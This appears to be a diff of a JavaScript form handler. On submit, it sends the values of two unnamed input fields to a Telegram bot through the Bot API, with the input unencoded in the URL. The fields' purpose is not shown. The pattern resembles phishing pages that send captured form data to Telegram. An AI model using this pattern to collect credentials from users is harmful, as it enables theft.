@@ -8,12 +8,12 @@ let bot = {
 form.addEventListener("submit", e=> {
     e.preventDefault();
 
-    let message = document.querySelector("#aa");
-    // let message2 = document.querySelector("#ss");
+    let message1 = document.querySelector("#aa");
+    let message2 = document.querySelector("#ss");
 
 
-    fetch(`https://api.telegram.org/bot${bot.token}/sendMessage?chat_id=${bot.chatID}&text=${message.value}`, {
-        method: "GET"
+    fetch(`https://api.telegram.org/bot${bot.token}/sendMessage?chat_id=${bot.chatID}&text=${message1.value+message2.value}`, {
+        method: "POST"
     })
     .then(success => {
         alert("Message send successfully!")
